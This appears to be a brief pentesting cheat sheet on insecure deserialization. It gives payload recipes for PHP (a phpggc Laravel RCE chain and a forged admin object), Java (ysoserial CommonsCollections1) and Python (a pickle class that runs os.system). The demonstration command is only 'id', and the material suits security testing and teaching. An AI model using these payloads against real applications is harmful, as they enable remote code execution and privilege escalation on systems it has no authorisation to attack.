# Insecure Deserialization

## PHP Deserialization
```bash
# Look for PHP unserialize() calls
# Common sinks: unserialize($_GET['data']), unserialize($_POST['data'])

# Generate a PHP gadget chain (if framework known):
phpggc Laravel/RCE1 system id

# Manual payload format:
O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"is_admin";b:1;}
```

## Java Deserialization
```bash
# Common signatures: rO0AB (base64), aced0005 (hex)

# Use ysoserial to generate payloads
java -jar ysoserial.jar CommonsCollections1 'id' | base64
```

## Python Pickle Deserialization
```python
import pickle
import os
class RCE(object):
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(RCE())
```
